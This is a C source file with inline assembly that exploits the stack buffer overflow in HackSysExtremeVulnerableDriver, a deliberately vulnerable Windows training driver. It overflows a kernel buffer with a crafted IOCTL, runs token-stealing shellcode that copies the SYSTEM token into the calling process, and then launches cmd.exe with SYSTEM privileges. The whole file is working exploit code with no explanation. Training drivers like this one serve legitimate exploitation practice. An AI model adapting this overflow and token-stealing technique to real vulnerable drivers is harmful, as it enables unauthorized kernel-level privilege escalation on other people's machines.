#include<stdio.h>
#include<Windows.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

__declspec(naked) VOID ShellCode()
{
	_asm
	{
		nop
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 0x50]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
		mov eax, [eax + 0xb8]
		sub eax, 0xb8
		cmp[eax + 0xb4], edx
		jnz find_sys_pid

		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		pop ebp
		ret 8
	}
}

int main()
{
	int NTStatus = 0;
	WORD recvbuf;

	puts("[+] Start...");
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		puts("Failed to Open Device");
		return 0;
	}

	puts("[+] Prepare Data...");
	CHAR buf[0x824];
	memset(buf, 'A', 0x824);

	*(PDWORD)(buf + 0x820) = (DWORD)ShellCode;

	puts("[+] Trigger vul");
	DeviceIoControl(hDevice, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, (PULONG)buf, 0x824, NULL, 0, &recvbuf, NULL);

	puts("cmd.exe...");
	CreateCmd();

	return 0;
}